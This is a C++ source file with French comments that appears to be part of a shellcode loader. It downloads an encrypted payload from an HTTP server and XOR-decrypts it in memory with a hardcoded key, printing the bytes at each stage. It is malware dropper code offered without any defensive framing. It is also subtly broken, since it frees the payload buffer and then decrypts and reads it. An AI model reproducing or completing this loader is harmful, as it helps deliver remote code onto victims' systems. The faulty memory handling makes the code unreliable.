#include <iostream> 
#include "HTTPClient.h" 
#include "decrypt.h" 
#include "Memory.h" 

int main() {
    // Etape 2 : Récupération du shellcode chiffré du serveur HTTP 
    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "Échec de la récupération du shellcode." << std::endl;
        return 1;
    }

    std::cout << "Shellcode récupéré (chiffré) :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    LocalFree(payload);

    // Fin de la récupération du shellcode chiffré du serveur http
    
    // Etape 3 : Déchiffrement du shellcode 
     // Clé de déchiffrement 

    unsigned char decryptionKey = 0xAA;

    // Déchiffrement du shellcode 

    decrypt(payload, payloadSize, decryptionKey);

    std::cout << "Shellcode après déchiffrement :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    // Fin du déchiffrement du shellcode 

    return 0;

}